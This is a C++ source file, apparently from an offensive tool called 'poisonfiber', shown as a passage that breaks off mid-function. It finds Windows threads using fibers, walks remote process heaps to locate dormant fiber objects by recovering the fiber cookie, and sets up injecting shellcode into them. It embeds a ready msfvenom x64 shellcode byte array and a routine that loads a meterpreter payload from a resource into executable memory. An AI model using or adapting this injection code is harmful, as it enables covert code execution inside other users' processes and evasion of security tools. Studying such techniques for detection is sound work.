#include "poisonfiber.h"
#include "resource.h"

/*
* Using this msfvenom shellcode when overwriting Dormant fiber code.
* Since overwriting Fiber code will crash the program after shellcode has executed.
* This shellcode is smaller than custom shellcode from resources,
* thus it is less likely to overwrite other Threads Fiber Code which may prevent our shellcode being switched to (executed).
*
* Clean up Ideas - Perhaps look at using a VEH to restore overwritten FiberCode after executing shellcode.
* The shellcode uses an exit function via seh.
* msfvenom -p windows/x64/exec cmd=calc exitfunc=seh -f c
*/
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xfe\x0e\x32\xea\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x00";

template<typename T>
BOOL foundInVector(std::vector<T> myVector, T item)
{
	if (std::find(myVector.begin(), myVector.end(), item) != myVector.end())
	{
		return true;
	}
	else
	{
		return false;
	}
}

BOOL IsMemReadable(HANDLE& hProcess, PVOID addrToRead, MEMORY_BASIC_INFORMATION& mbi)
{
	if (!VirtualQueryEx(hProcess, addrToRead, &mbi, sizeof(MEMORY_BASIC_INFORMATION)))
	{
		printf("[-] VirtualQueryEx Failed\n");
		return false;
	}

	if (!(mbi.Protect == PAGE_READONLY || mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_EXECUTE_READWRITE))
		return false;

	return true;
}

// https://www.unknowncheats.me/forum/c-and-c-/304873-checking-valid-pointer.html
//
BOOL IsInvalidPtr(PVOID ptr)
{
	static SYSTEM_INFO si = {};
	if (nullptr == si.lpMinimumApplicationAddress)
	{
		GetSystemInfo(&si);
	}

	return (((uint64_t)ptr < (uint64_t)si.lpMinimumApplicationAddress || (uint64_t)ptr >(uint64_t)si.lpMaximumApplicationAddress));
}

BOOL IsNtHeapBlockAddr(std::vector<HeapEntryMeta> heapEntryMetaVector, uint64_t addr)
{
	for (const auto heapEntryMeta : heapEntryMetaVector)
	{
		if (heapEntryMeta.heapBlockAddr == addr)
		{
			return true;
		}
	}

	return false;
}

// https://github.com/wine-mirror/wine/blob/master/dlls/ntdll/thread.c#L485
static unsigned int GetFlsChunkSz(unsigned int chunk_index)
{
	return 0x10 << chunk_index;
}

// https://github.com/wine-mirror/wine/blob/master/dlls/ntdll/thread.c#L495
static unsigned int GetFlsChunkIndexFromIndex(unsigned int index, unsigned int* index_in_chunk)
{
	unsigned int chunk_index = 0;

	while (index >= GetFlsChunkSz(chunk_index))
	{
		index -= GetFlsChunkSz(chunk_index++);
	}

	*index_in_chunk = index;
	return chunk_index;
}

// Since no FLS indexes have been allocated in the scanner this should generate the maximum index available for the current host
DWORD GetMaxFlsIndexValue()
{
	printf("[+] Getting max FLS Index value\n");

	DWORD result = 0;
	DWORD maxIndex = 0;
	UINT count = 0;

	while (result != FLS_OUT_OF_INDEXES)
	{
		result = FlsAlloc(NULL);
		count += 1;

		if (result != FLS_OUT_OF_INDEXES) {

			maxIndex = result;
		}
	}

	printf("[!] Max FLS Index value: %i\n", maxIndex);
	printf("[!] Out of available slots at attempt: %i\n", count);

	return maxIndex;
}

// Uses SameTebFlags to determine if a thread is running fibers.
// https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/teb/sametebflags.htm
BOOL IsThreadUsingFibers(HANDLE& hProcess, THREAD_BASIC_INFORMATION& tbi)
{
	SIZE_T nBytesRead = 0;
	USHORT sameTebFlags = 0; // SameTebFlags is a bit mask that can be used to determine if a thread is running fibers.

	if (!ReadProcessMemory(hProcess, (LPCVOID)((uint64_t)tbi.TebBaseAddress + TebOffset_SameTebFlags), &sameTebFlags, sizeof(USHORT), &nBytesRead))
	{
		printf("[-] ReadProcessMemory failed to read SameTebFlags: %i\n", GetLastError());
		return false;
	}

	if (!(sameTebFlags & HasFiberDataMask))
	{
		return false; // Thread isn't using fibers
	}

	return true;
}

// Collects information of the current fiber from the TEB & TIB
// Calculates basepFiberCookie - which can be used to calculate FiberObjects for dormant fibers when matching against enumerated heap objects.
BOOL GetFiberObjectInfo(HANDLE& hProcess, THREAD_BASIC_INFORMATION tbi, Fiber& currentFiber, uint64_t& basepFiberCookie)
{
	// Collect TEB
	TEB teb = { 0 };
	if (!ReadProcessMemory(hProcess, tbi.TebBaseAddress, &teb, sizeof(TEB), NULL))
	{
		printf("[-] ReadProcessMemory failed to read TEB: %i\n", GetLastError());
		return false;
	}

	/*
	If TEB->FlsData value == NULL && FiberObject-> then we are operating the non-primary fiber. FiberLocalStorage (FLS) is not being used for that fiber.
	Get Fiber related fields from the TEB
		0:002 > dt ntdll!_TEB
		  +0x17c8 FlsData : Ptr64 Void
	if (!ReadProcessMemory(hProcess, (LPCVOID)((uint64_t)tbi.TebBaseAddress + TebOffset_FlsData), &tebFlsData, sizeof(PVOID), NULL))
	{
		printf("[-] ReadProcessMemory Failed to read TebOffset_FlsData: %i\n", GetLastError());
		return false;
	}
	*/

	PVOID tibFiberData = NULL;
	if (!ReadProcessMemory(hProcess, (LPCVOID)((uint64_t)tbi.TebBaseAddress + TibOffset_FiberData), &tibFiberData, sizeof(PVOID), NULL))
	{
		printf("[-] ReadProcessMemory Failed to read TibOffset_FiberData: %i\n", GetLastError());
		return false;
	}

	// If TIB->FiberData points to something
	if (tibFiberData)
	{
		if (!ReadProcessMemory(hProcess, tibFiberData, &currentFiber, sizeof(Fiber), NULL))
		{
			printf("[-] ReadProcessMemory Failed to read current Fiber object using TibOffset_FiberData: %i\n", GetLastError());
			return false;
		}
	}
	else
	{
		printf("[-] Unable to collect FiberData / FiberData == NULL\n");
	}

	// Set FiberData field in fiberData, this isn't set for running fibers.
	currentFiber.FiberData = tibFiberData;

	// Calculate BasepFiberCookie 
	// See CreatFiberEx!KernelBase.dll for XoredCookie being set in Fiber object, merely reversing this process (simultaneous equations) to get BasepFiberCookie value.
	uint64_t stackBase = (uint64_t)currentFiber.StackBase;
	uint64_t xoredCookie = currentFiber.XoredCookie;
	uint64_t fiberObject = (uint64_t)tibFiberData;

	// This seems to work :)
	uint64_t tmp = xoredCookie ^ stackBase;
	basepFiberCookie = tmp ^ fiberObject;
	printf("\t[!] basepFiberCookie: %llx\n", basepFiberCookie);


	/*
	*  This is to use against dormant fiber heap blocks.
	*  Now calculate fiberObject value, using - baseFiberCookie, xoredCookie & stackbase.
	*  Cross reference fiberObject values against heapblocks. when enumerating.
	*/
	uint64_t tmp2 = basepFiberCookie ^ stackBase;
	uint64_t fiberObject2 = xoredCookie ^ tmp2;
	printf("\t[!] Reconstructed FiberObject ptr: %llx\n", fiberObject2);

	/*
	* Enumerate heap block entries of process's running fibers. (to get potential fiberobject values)
	* Use heapBlock address to create a XoredCookie.
	* Check heap block to see if XoredCookie value matches offset of that heap entry.
	* If it matches then this is a dormant fiber currently running under the same thread.
	*/

	return true;
}

// Enumerates currently running fibers
// Also collects list of NT heap block entries for processes with threads running fibers.
void GetCurrentThreadsUsingFibers(std::vector<TidPid> tidPidVector, std::vector<FiberInfo>& fiberInfoVector)
{
	DWORD scannerPid = NULL;
	scannerPid = GetCurrentProcessId();

	for (const auto& tidPid : tidPidVector)
	{
		NTSTATUS status = STATUS_SUCCESS;
		THREAD_BASIC_INFORMATION tbi = { 0 };
		HANDLE hProcess = NULL;
		HANDLE hThread = NULL;
		uint64_t basepFiberCookie = 0;
		BOOL wow64Process = false;
		Fiber fiberObject = { 0 };
		FiberInfo fiberinfo = {};

		// Skip system PID && self.
		if ((tidPid.pid == 4) || (tidPid.pid == scannerPid))
			continue;

		// Get Handles to the thread and owning process.
		hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, tidPid.pid);
		if (!hProcess)
		{
			goto Cleanup;
		}

		// Skip WOW64 processes.
		IsWow64Process(hProcess, &wow64Process);
		if (wow64Process)
		{
			continue;
		}

		hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tidPid.tid);
		if (!hThread)
		{
			goto Cleanup;
		}

		// Get TEB and Thread basic info
		status = NtQueryInfoThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
		if (status != STATUS_SUCCESS)
		{
			goto Cleanup;
		}

		// Skip if thread isn't running fibers.
		if (!IsThreadUsingFibers(hProcess, tbi))
		{
			goto Cleanup;
		}
		else
		{
			printf("[+] PID: %i, Thread ID: %i, using fibers\n", tidPid.pid, tidPid.tid);
		}

		// Get BasepFiberCookie for thread.
		if (!GetFiberObjectInfo(hProcess, tbi, fiberObject, basepFiberCookie))
		{
			goto Cleanup;
		}


		// If we get here then we have all the info we need from the current fiber.
		fiberinfo.tidPid = tidPid;
		fiberinfo.current = true;
		fiberinfo.fiberObject = fiberObject;
		fiberinfo.basepFiberCookie = basepFiberCookie;
		fiberInfoVector.push_back(fiberinfo);



		// Cleanup handles for each Thread and owning process.
	Cleanup:
		if (hThread != NULL)
		{
			CloseHandle(hThread);
		}

		if (hProcess != NULL)
		{
			CloseHandle(hProcess);
		}
	}
}

// Takes snapshot of TIDs and owning PIDs.
BOOL ListProcessThreads(std::vector<TidPid>& tidPidVector)
{
	printf("[+] Taking a snapshot of running Threads\n");

	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32 = {};

	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	te32.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hThreadSnap, &te32))
	{
		printf("[-] Thread32First failed\n");
		CloseHandle(hThreadSnap);
		return FALSE;
	}

	do
	{
		TidPid tidPid = {};
		tidPid.tid = te32.th32ThreadID;
		tidPid.pid = te32.th32OwnerProcessID;
		tidPidVector.push_back(tidPid);

	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	return TRUE;
}

BOOL InitializeFuncs()
{
	NtQueryInfoThread = (_NtQueryInformationThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread");

	if (NtQueryInfoThread == NULL)
	{
		printf("[-] Failed to resolve NtQueryInformationThread\n");
		return false;
	}

	NtQueryInfoProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");

	if (NtQueryInfoProcess == NULL)
	{
		printf("[-] Failed to resolve NtQueryInformationProcess\n");
		return false;
	}

	printf("[+] Initialized Functions\n");
	return true;
}

BOOL LoadShellcodeFromResource()
{
	// IDR_SHELLCODE_BIN1 - is the resource ID - which contains the shellcode
	// SHELLCODE_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE_BIN1), L"SHELLCODE_BIN");
	if (!shellcodeResource)
	{
		printf("[-] Failed to find shellcode resource\n");
		return false;
	}

	shellcodeSize = SizeofResource(NULL, shellcodeResource);
	if (!shellcodeSize)
	{
		printf("[-] Failed to retrieve resource size\n");
		return false;
	}

	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
	if (!shellcodeResouceData)
	{
		printf("[-] Failed to load resource\n");
		return false;
	}

	shellcodeAddr = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!shellcodeAddr)
	{
		printf("[-] Failed to allocate memory for resource\n");
		return false;
	}

	memcpy(shellcodeAddr, shellcodeResouceData, shellcodeSize);

	printf("[+] Loaded shellcode from resource\n");
	return true;
}

// Decodes _HEAP_ENTRY's header to reveal heap block size
void DecodeHeader(uint64_t encodeFlagMask, unsigned char encoding[16], uint64_t heapBlock)
{
	unsigned char decodedFields[8];
	unsigned char encodedFields[8];

	// Decode the first few fields of the heapBlock so we can get correct Size, Flags & SmallTagIndex.
	//0:002 > dt ntdll!_HEAP_ENTRY
	//    + 0x000 PreviousBlockPrivateData : Ptr64 Void
	//    + 0x008 Size : Uint2B
	//    + 0x00a Flags : UChar
	//    + 0x00b SmallTagIndex : UChar
	//
	if (encodeFlagMask != NULL)
	{
		memcpy(encodedFields, (const void*)(heapBlock + 0x008), 8);

		for (int i = 0; i < 8; ++i)
		{
			decodedFields[i] = encodedFields[i] ^ encoding[i + 8];
		}

		memcpy((void*)(heapBlock + 0x008), decodedFields, 8);
	}
}

// Passes back memory basic information structure if heap of NT type.
BOOL IsNtHeapPtr(HANDLE hProcess, LPVOID heapPtr, MEMORY_BASIC_INFORMATION& mbi)
{
	SIZE_T result;
	uint32_t segmentSignature = 0;

	if (heapPtr == NULL)
	{
		return false;
	}

	result = VirtualQueryEx(hProcess, heapPtr, &mbi, sizeof(mbi));
	if (result != sizeof(mbi))
	{
		return false;
	}

	// Check if protections and state correspond match those of expected heapPtr
	// RtlAllocateHeap only accepts a handle from a private heap which has been created by RtlCreateHeap.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcreateheap
	// Although NT heaps of Type == MEM_MAPPED exist fiber objects will not reside here, so skip.
	// https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
	if (!((mbi.State == MEM_COMMIT) && (mbi.Type == MEM_PRIVATE) && (mbi.Protect == PAGE_READWRITE)))
	{
		printf("[!] Skipped NTHeap of Type:MEM_MAPPED. Only interested in Type:MEM_PRIVATE\n");
		return false;
	}

	// Read segment signature of heap from _HEAP Header
	// dt ntdll!_HEAP
	// 0:002> dt ntdll!_HEAP
	//    + 0x000 Segment           : _HEAP_SEGMENT
	//    + 0x000 Entry             : _HEAP_ENTRY
	//    + 0x010 SegmentSignature  : Uint4B
	if (!ReadProcessMemory(hProcess, (LPCVOID)((uint64_t)heapPtr + 0x010), &segmentSignature, sizeof(uint32_t), NULL))
	{
		printf("[-] ReadProcessMemory failed to read heapPtr: %i\n", GetLastError());
		return false;
	}

	if (segmentSignature == SegmentHeap)
	{
		printf("[!] Fiber using Segment type heap, skipping\n");
		return false;
	}

	if (segmentSignature != NtHeap)
	{
		printf("[!] Fiber using unknown heap type, skipping\n");
		return false;
	}

	return true;
}

/*
*  Function collects NT type Heap block entry meta-data by:
*  1. Reading heaps of NT type from the PEB
*  2. Decoding heap block headers to reveal size of heap block and determine the requested size given to RtlAllocateHeap function.
*/
BOOL EnumNtHeap(HANDLE& hProcess, std::vector<HeapEntryMeta>& heapEntryMetaVector)
{
	PROCESS_BASIC_INFORMATION pbi = {};
	PEB peb = {};
	std::vector<PVOID> heapPtrVector = {};
	std::vector<MEMORY_BASIC_INFORMATION> mbiNtHeapsVector = {};
	uint32_t nHeaps = NULL;
	uint32_t maxHeaps = NULL;
	PVOID heapsPtr = NULL;

	// Get PEB
	NTSTATUS status = NtQueryInfoProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (!NT_SUCCESS(status))
	{
		printf("[-] NtQueryInfoProcess failed to collect ProcessBasicInformation\n");
		return false;
	}

	if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
	{
		printf("[-] ReadProcessMemory failed to read address of the PEB: %i\n", GetLastError());
		return false;
	}

	/*
	*  Get Heap info.
	*  0:002 > dt ntdll!_PEB
	*      + 0x0e8 NumberOfHeaps : Uint4B
	*      + 0x0ec MaximumNumberOfHeaps : Uint4B
	*      + 0x0f0 ProcessHeaps : Ptr64 Ptr64 Void
	*/
	nHeaps = (uint64_t)peb.Reserved9[16] & 0x00000000FFFFFFFF;  // NumberOfHeaps;
	maxHeaps = (uint64_t)peb.Reserved9[16] >> 32;               // MaximumNumberOfHeaps;
	heapsPtr = (PVOID*)peb.Reserved9[17];                       // ProcessHeaps;

	// Adjust of size of heapPtrVector to nHeaps elements.
	heapPtrVector.resize(nHeaps);

	// Read heap pointers
	if (!ReadProcessMemory(hProcess, heapsPtr, heapPtrVector.data(), sizeof(PVOID) * nHeaps, NULL))
	{
		printf("[-] ReadProcessMemory failed to read address heap pointers into heapPtrVector: %i\n", GetLastError());
		return false;
	}

	// Only collect NT type heaps.
	for (const auto& heapPtr : heapPtrVector)
	{
		MEMORY_BASIC_INFORMATION mbi = {};

		if (!IsNtHeapPtr(hProcess, heapPtr, mbi))
		{
			continue;
		}
		mbiNtHeapsVector.push_back(mbi);
	}

	if (mbiNtHeapsVector.empty())
	{
		printf("[!] No NT type heaps found\n");
		return false;
	}

	// Enumerate _HEAP_ENTRYs
	for (const auto& mbiNtHeap : mbiNtHeapsVector)
	{
		HeapEntryMeta heapEntryMeta = { 0 };
		unsigned char encoding[16];
		uint32_t encodeFlagMask = NULL;
		uint64_t requestedBytes = NULL;

		// We could change this later to only read the size of the _HEAP hdr but we would have to manually define the struct.
		void* heapBuffer = calloc(1, mbiNtHeap.RegionSize);
		if (!ReadProcessMemory(hProcess, mbiNtHeap.AllocationBase, heapBuffer, mbiNtHeap.RegionSize, NULL))
		{
			printf("[-] ReadProcessMemory failed to read heap: %i\n", GetLastError());
			free(heapBuffer);
			continue;
		}

		/*
		*  Get the Encoding value and FlagMask from the heap header.
		*  The EncodeFlagMask determines if heap entries are encoded:
		*     Encoded == 0x00100000
		*     Non-encoding == 0x00000000
		*
		*  The Encoding field can be use to decode _HEAP_ENTRY values.
		* 0:002 > dt ntdll!_HEAP
		*     + 0x07c EncodeFlagMask : Uint4B
		*     + 0x080 Encoding : _HEAP_ENTRY
		* 0:002 > ?? sizeof(_HEAP_ENTRY)
		*     unsigned int64 0x10
		*/
		memcpy(encoding, (const void*)((uint64_t)heapBuffer + 0x80), 16);
		memcpy(&encodeFlagMask, (const void*)((uint64_t)heapBuffer + 0x07c), 4);

		// Get HEAP_SEGMENTS
		// dt ntdll!_HEAP_SEGMENT
		/*	+ 0x000 Entry            : _HEAP_ENTRY
		*	+ 0x010 SegmentSignature : Uint4B
		*	+ 0x014 SegmentFlags : Uint4B
		*	+ 0x018 SegmentListEntry : _LIST_ENTRY
		*	+ 0x028 Heap : Ptr64 _HEAP
		*	+ 0x030 BaseAddress : Ptr64 Void
		*	+ 0x038 NumberOfPages : Uint4B
		*	+ 0x040 FirstEntry : Ptr64 _HEAP_ENTRY
		*	+ 0x048 LastValidEntry : Ptr64 _HEAP_ENTRY
		*/
		HEAP_SEGMENT heapSegment = { 0 };
		memcpy(&heapSegment, (const void*)(uint64_t)heapBuffer, sizeof(HEAP_SEGMENT));

		std::vector<LIST_ENTRY*> segmentListEntryVector = {};
		LIST_ENTRY segmentListEntry = {};

		// Then loop through heap segments to get a list of valid segments.
		if (!ReadProcessMemory(hProcess, heapSegment.SegmentListEntry.Flink, &segmentListEntry, sizeof(segmentListEntry), NULL))
		{
			printf("[-] ReadProcessMemory failed to read SegmentListEntry->Flink:%i\n", GetLastError());
		}

		while (true)
		{

			if (foundInVector(segmentListEntryVector, segmentListEntry.Flink))
			{
				break;
			}

			segmentListEntryVector.push_back(segmentListEntry.Flink);

			if (!ReadProcessMemory(hProcess, segmentListEntry.Flink, &segmentListEntry, sizeof(segmentListEntry), NULL))
			{
				printf("[-] ReadProcessMemory failed to read SegmentListEntry->Flink [2]:%i\n", GetLastError());
			}

		}

		// Now collect Segment headers
		std::vector<HEAP_SEGMENT> heapSegmentVector = {};
		for (const auto& entry : segmentListEntryVector)
		{
			heapSegment = { 0 };

			/*
			*  Minus 0x18 since LIST_ENTRY starts 0x18 byes into _HEAP_SEGMENT structure.
			* 0:002 > dt ntdll!_HEAP_SEGMENT
			* 	+ 0x000 Entry            : _HEAP_ENTRY
			* 	+ 0x010 SegmentSignature : Uint4B
			* 	+ 0x014 SegmentFlags : Uint4B
			* 	+ 0x018 SegmentListEntry : _LIST_ENTRY
			* 	+ 0x028 Heap             : Ptr64 _HEAP
			*/
			if (!ReadProcessMemory(hProcess, (LPCVOID)((uint64_t)entry - 0x18), &heapSegment, sizeof(HEAP_SEGMENT), NULL))
			{
				printf("[-] ReadProcessMemory failed to read heap Segment header :%i\n", GetLastError());
			}

			// Validate heapSegment
			if (heapSegment.Heap == NULL || heapSegment.NumberOfPages == NULL || heapSegment.FirstEntry == NULL || heapSegment.SegmentSignature != 0xffeeffee)
				continue;

			heapSegmentVector.push_back(heapSegment);

		}

		// Loop through the _HEAP_SEGMENT to read regions of memory for committed heap blocks.
		for (const auto& segment : heapSegmentVector) {

			/*
			*  Size of Mem to read for committed heap blocks
			*  From : FirstEntry
			*  To : LastValidEntry - (NumberOfUnCommittedPages *  PageSize)
			*/
			uint64_t lastValidCommitedEntry = NULL;
			uint64_t nBytesCommittedHeapBlocks = NULL;

			lastValidCommitedEntry = (uint64_t)segment.LastValidEntry - (segment.NumberOfUnCommittedPages * 0x1000);
			nBytesCommittedHeapBlocks = lastValidCommitedEntry - (uint64_t)segment.FirstEntry;

			uint64_t* heapBlocksBuffer = (uint64_t*)calloc(1, nBytesCommittedHeapBlocks);

			if (!ReadProcessMemory(hProcess, (LPCVOID)segment.FirstEntry, heapBlocksBuffer, nBytesCommittedHeapBlocks, NULL))
			{
				printf("[-] ReadProcessMemory failed to read heap Segment buffer :%i\n", GetLastError());
				free(heapBlocksBuffer);
				continue;
			}

			uint64_t currentHeapBlockEntry = 0;
			uint64_t blockOffset = 0;
			uint64_t heapBlocksBufferTmp = (uint64_t)heapBlocksBuffer;

			currentHeapBlockEntry = (uint64_t)segment.FirstEntry;

			// Enumerate _HEAP_ENTRY blocks. 
			while (currentHeapBlockEntry < lastValidCommitedEntry)
			{
				// Decode encoded _HEAP_ENTRY
				DecodeHeader(encodeFlagMask, encoding, (uint64_t)heapBlocksBufferTmp);

				/*
				*  Copy _HEAP_ENTRY header
				*   0:003 > dt _HEAP_ENTRY
				*     ntdll!_HEAP_ENTRY
				*     + 0x008 Size              : Uint2B
				*     + 0x00a Flags             : UChar
				*     + 0x00b SmallTagIndex     : UChar
				*     + 0x00c PreviousSize      : Uint2B
				*     + 0x00f UnusedBytes       : UChar
				*/
				HEAP_ENTRY heapEntryHdr = { 0 };
				memcpy(&heapEntryHdr, (void*)heapBlocksBufferTmp, sizeof(HEAP_ENTRY));

				/*
				*  Size & PreviousSize need to be multiplied by the granularity which is:
				*  0x10 for x64.
				*  0x08 for x86.
				*/
				heapEntryHdr.Size *= Granulariy;
				heapEntryHdr.PreviousSize *= Granulariy;

				// This will be the 3rd parameter given to ntdll!RtlAllocateHeap when creating a Fiber Object via CreateFiberEx & ConvertThreadToFiber/Ex API calls.
				requestedBytes = heapEntryHdr.Size - heapEntryHdr.UnusedBytes;

				/*
				* printf("Address:            0x0000%llx\n", currentHeapBlockEntry);
				* printf("Heap Block Size:    0x%x\n", heapEntryHdr.Size);
				* printf("Previous   Size:    0x%x\n", heapEntryHdr.PreviousSize);
				* printf("Flags:              0x%x\n", heapEntryHdr.Flags);
				* printf("Unused Bytes   :    0x%x\n", heapEntryHdr.UnusedBytes);
				* printf("Requested bytes:    0x%x\n\n", requestedBytes);
				*/

				// Save _HEAP_ENTRY info
				heapEntryMeta.pid = (DWORD)pbi.UniqueProcessId;
				heapEntryMeta.ntHeapAddr = (PVOID)segment.Heap;
				heapEntryMeta.heapBlockAddr = currentHeapBlockEntry;
				heapEntryMeta.heapBlockSize = heapEntryHdr.Size;
				heapEntryMeta.flags = heapEntryHdr.Flags;
				heapEntryMeta.unusedBytes = heapEntryHdr.UnusedBytes;
				heapEntryMeta.requestedBytes = requestedBytes;
				heapEntryMetaVector.push_back(heapEntryMeta);

				// Update address of next HEAP_ENTRY 
				currentHeapBlockEntry += heapEntryHdr.Size;
				// Increment buffer to start of next HEAP_ENTRY
				heapBlocksBufferTmp += heapEntryHdr.Size;
			}

			free(heapBlocksBuffer);
		}


		// Remove this to only read the fields we care about rather than whole heap!
		free(heapBuffer);
	}

	return true;
}

// Looks for heap entries with a requested block size allocation of 0x530 bytes as potential FiberObjects
void EnumFibersFromHeapBlocks(HANDLE& hProcess, std::vector<HeapEntryMeta> heapEntryMetaVector, FiberInfo& fiberinfo)
{

	for (const auto& heapEntryMeta : heapEntryMetaVector)
	{
		// KernelBase!CreateFiberEx - RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, KernelBaseGlobalData, 0x530ui64);
		if (heapEntryMeta.requestedBytes == 0x530)
		{

			// Skip first 0x10 bytes due to _HEAP_ENTRY header.
			// Then read in the Fiber object
			Fiber fiberObject = { 0 };
			if (!ReadProcessMemory(hProcess, (PVOID)(heapEntryMeta.heapBlockAddr + 0x10), &fiberObject, sizeof(Fiber), NULL))
			{
				printf("[-] ReadProcessMemory failed to Fiber from heap entry: %i\n", GetLastError());
				continue;
			}

			/*
			* Use the XoredCookie value to calculate the FiberData (of address of fiber object heapBlockAddr + 0x10) using the same BasepFiberCookie from the running fiber object.
			* If they match then we confirm this is a dormant fiber.
			*
			* This is for when we have heap blocks.
			* Now calculate fiberObject value, using - baseFiberCookie, xoredCookie & stackbase.
			* Cross reference fiberObject values against heapblocks. when enumerating.
			*/
			uint64_t basepFiberCookie = fiberinfo.basepFiberCookie;
			uint64_t stackBase = (uint64_t)fiberObject.StackBase;
			uint64_t xoredCookie = fiberObject.XoredCookie;

			uint64_t tmp2 = basepFiberCookie ^ stackBase;
			uint64_t fiberObjectPtr_reconstructed = xoredCookie ^ tmp2;
			printf("[+] Reconstructed FiberObject ptr: %llx\n", fiberObjectPtr_reconstructed);
			printf("\t[!] heapEntryMeta.heapBlockAddr + 0x10: %llx\n", heapEntryMeta.heapBlockAddr + 0x10);
			printf("\t[!] fiberObject->FiberData: %llx\n", (uint64_t)fiberObject.FiberData);

			if (fiberObjectPtr_reconstructed == (heapEntryMeta.heapBlockAddr + 0x10))
			{

				if (fiberObjectPtr_reconstructed != (uint64_t)fiberinfo.fiberObject.FiberData)
				{
					printf("[+] New Dormant fiber object found!\n");
					// Patch up location so we can write to object later.
					fiberObject.FiberData = (PVOID)(heapEntryMeta.heapBlockAddr + 0x10);
					fiberinfo.dormantFibervector.push_back(fiberObject);
				}
			}

		}
	}
}

/*
* A Fiber object->FlsData point will point to a LIST_ENTRY linked list.
* Fibers running on the same thread will have their own LIST_ENTRY within the same shared linked list.
* This function:
* 1. Enumerates the LINKED_ENTRIES * linked list until it circles back on itself, then stores this in a vector of LIST_ENTRY ptrs.
* 2. Creates a master list of LINKED_ENTRIES * which is later used to determine TIDs for dormant fibers on heap
*		As dormant fibers have no tid reference in their heap fiber object,
*		but the currently executing fibers which share the same LIST_ENTRY linked list will do (since it has been added from the TEB during previous enrichment)
*/
BOOL GetFlsLinkedEntries(HANDLE& hProcess, LPCVOID pFlsData, std::vector<LIST_ENTRY*>& listEntryVector)
{
	TEB_FLS_DATA flsData = {};
	LIST_ENTRY flsListHead = {};

	// Check Fls Data for null value.
	if (pFlsData == NULL)
	{
		printf("[!] FlsData value == NULL. No FLS assigned to fiber!\n");
		return false;
	}

	// Read FLS data.
	if (!ReadProcessMemory(hProcess, pFlsData, &flsData, sizeof(flsData), NULL))
	{
		printf("[-] ReadProcessMemory failed to read fls data: %i\n", GetLastError());
		return false;
	}

	// pfls_list_head = flsData.fls_list_entry.Flink;
	if (!ReadProcessMemory(hProcess, flsData.flsListEntry.Flink, &flsListHead, sizeof(flsListHead), NULL))
	{
		printf("[-] ReadProcessMemory failed to read fls_list_head->Flink:%i\n", GetLastError());
		return false;
	}

	while (true)
	{
		if (foundInVector(listEntryVector, flsListHead.Flink))
		{
			break;
		}

		listEntryVector.push_back(flsListHead.Flink);

		if (!ReadProcessMemory(hProcess, flsListHead.Flink, &flsListHead, sizeof(flsListHead), NULL))
		{
			printf("[-] ReadProcessMemory failed to read fls_list_head->Flink:%i\n", GetLastError());
		}
	}

	return true;
}

// Returns True if successfully found the callback table.
BOOL GetFlsCallbackTable(HANDLE& hProcess, std::vector<LIST_ENTRY*> flsListEntries, std::vector<HeapEntryMeta> heapEntryMetaVector, ULONG index, CallbackTableMeta& callbackTable)
{

	// One flsListEntry(LIST_ENTRY)/Thread will contain a flsCallback chunk that points to the callback table.
	// The callback table will be stored in its own individual heap block entry.
	for (const auto& flsListEntry : flsListEntries)
	{
